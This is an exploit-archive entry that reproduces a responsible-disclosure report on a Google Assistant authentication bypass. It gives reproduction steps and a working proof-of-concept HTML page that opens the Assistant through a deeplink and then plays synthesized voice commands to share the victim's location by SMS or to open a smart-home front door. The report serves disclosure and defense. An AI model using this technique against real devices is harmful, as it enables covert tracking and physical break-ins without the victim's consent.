@@ -1,0 +1,100 @@
+id: 37020
+date: 11/09/2021
+title: Google Assistant Authentication Bypass Vulnerability
+author: David Schutz
+cves: 
+
+Auth Bypass in Google Assistant
+
+Summary: Webpage can execute Google Assistant commands without any permissions
+
+Steps to reproduce:
+
+    Generate the TTS audio files using the Google Cloud TTS API, using the text commands in the JavaScript comments
+    Make sure the device is not muted, or have headphones connected
+    Open the POC HTML on an Android device with Google Assistant
+    Click one of the POC attacks
+    See the Google Assistant commands execute automatically, without any permissions
+
+This attack works by first triggering Google Assistant using a deeplink (acquired from the mobile “google.com” page, where there is a button to trigger the Assistant) and after a bit of delay, playing TTS generated commands as plain audio.
+
+This attack can be exploited the same way (or sending a “VOICE_COMMAND” intent) by Android applications (without any permissions required), actually that was my first idea, but I figured that the impact is way higher if a victim only has to visit a webpage to get the same results.
+
+One weird thing I noticed while testing using the Chrome browser on Android, is that an audio file is played differently depending on the length. This forced me to split the attacking commands into different audio files (for example the “share location” and the phone number are different commands), since when I tried to play the longer audio file, Chrome interpreted it as a “media”, and displayed the media control notification as well. And triggering Assistant while a longer audio “media” was playing, caused Assistant to pause the audio. When using shorter audio files, the media control notification did not appear, and Assistant didn’t pause the media, allowing it to execute the malicious commands.
+
+I used the Cloud Text-to-Speech API to generate the audio files. I used language_code=’en-US’ and name=”en-US-Wavenet-A” to generate the audio files. All of the text input used to generate the audio files can be found in the JavaScript comments.
+
+I attached 2 POC videos to make it easier to see the attack running:
+
+Single command POC Video: https://youtu.be/T3CgECvV-qM
+
+Multiple command / Confirmation POC Video: [redacted]
+
+— POC HTML —
+
+<html>
+
+<body>
+    
+    <h1>
+        <a onclick="share()" href="googleapp://deeplink/?data=CkwBDb3mGzBFAiEAic8-0un3nRrMa_hkMUV9fj_zD09xhu9D6xTXEsFSRPICIEJlWlJRSqv3afrbX9J8BZa_h3sAfF8NSDFAlLSj10MUEjkKAggAEgIIbxoQEg4IBBIK6oqo9AQECAFAACIdChtodHRwOi8vYXNzaXN0YW50Lmdvb2dsZS5jb20">
+            share location</a>
+    </h1>
+    
+    <h1>
+        <a onclick="opendoor()" href="googleapp://deeplink/?data=CkwBDb3mGzBFAiEAic8-0un3nRrMa_hkMUV9fj_zD09xhu9D6xTXEsFSRPICIEJlWlJRSqv3afrbX9J8BZa_h3sAfF8NSDFAlLSj10MUEjkKAggAEgIIbxoQEg4IBBIK6oqo9AQECAFAACIdChtodHRwOi8vYXNzaXN0YW50Lmdvb2dsZS5jb20">open
+            front door</a>
+    </h1>
+
+    <script>
+        // language_code='en-US'
+        // name="en-US-Wavenet-A"
+
+        function share() {
+            setTimeout(function() {
+
+                var audio = new Audio('share1.mp3'); // "share my location with"
+                audio.play();
+
+                setTimeout(function() {
+
+                    var audio = new Audio('share2.mp3'); // "[redacted]" [PHONE NUMBER TO SEND SMS TO]
+                    audio.play();
+
+                    setTimeout(function() {
+                        var audio = new Audio('confirm.mp3'); // "send it"
+                        audio.play();
+                    }, 12000);
+
+                }, 6000);
+
+            }, 500);
+        }
+
+        function opendoor() {
+            setTimeout(function() {
+
+                var audio = new Audio('open.mp3'); // "open the front door"
+                audio.play();
+
+            }, 500);
+        }
+    </script>
+
+</body>
+
+</html>
+
+— END POC HTML —
+
+Attack scenario: This attack allows an attacker to execute malicious commands in Google Assistant, on behalf of the victim, just by making the victim visit a webpage. The Assistant has access to extremely sensitive information, and may be able to control the victim’s Google Account, Smart Home, and other IOT appliances. An attacker should never be able to execute commands in Google Assistant, without having sufficient permissions.
+
+Limitation of this attack:
+
+    The phone must not be muted or have headphones connected, since Google Assistant wouldn’t hear the malicious audio
+    The malicious commands could be heard by the user, since they are playing out loud
+    The attack will fail if the user closes the Assistant mid-attack
+
+Why I checked “Is this vulnerability public or known to third parties?”: I found out about this issue (only the idea of playing the commands as audio, using the phone) by browsing forums where people were talking about finding ways to execute Assistant commands to automate their different workflows. This method was posted publicly as an “Automate” (Android automating app) “flow” to execute an Assistant command. Their motivations wasn’t malicious, but I realized that this method could be abused by an attacker, and made it into a POC. Therefore, I mark this vulnerability as public, since anyone can find this information and use it for malicious purposes.
+
+#  0day.today [2023-03-23]  #
